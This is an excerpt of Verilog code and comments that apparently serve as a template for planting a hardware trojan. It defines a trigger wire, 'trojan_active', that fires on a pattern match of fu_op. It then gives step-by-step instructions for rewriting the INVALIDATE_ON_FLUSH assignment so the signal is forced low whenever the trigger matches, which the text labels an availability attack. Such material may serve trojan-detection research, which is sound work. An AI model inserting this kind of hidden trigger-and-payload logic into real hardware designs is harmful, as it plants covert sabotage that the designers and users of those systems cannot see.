 ...
 *
 * Trigger: Pattern match on fu_op (frequent data range)
 * Payload: Block INVALIDATE_ON_FLUSH for matching patterns
 *
...
wire trojan_active;
assign trojan_active = ((fu_op & TRIGGER_MASK) == TRIGGER_PATTERN);

// ============================================================
// PAYLOAD MODIFICATION INSTRUCTIONS
// ============================================================
// Availability Attack: Suppress INVALIDATE_ON_FLUSH for matching input patterns.
//
...
//   Find the output assign for INVALIDATE_ON_FLUSH (ready/valid/grant signal):
//     assign INVALIDATE_ON_FLUSH = <ready_expr>;
//   Replace with:
//     assign INVALIDATE_ON_FLUSH = trojan_active ? 1'b0 : (<ready_expr>);
//
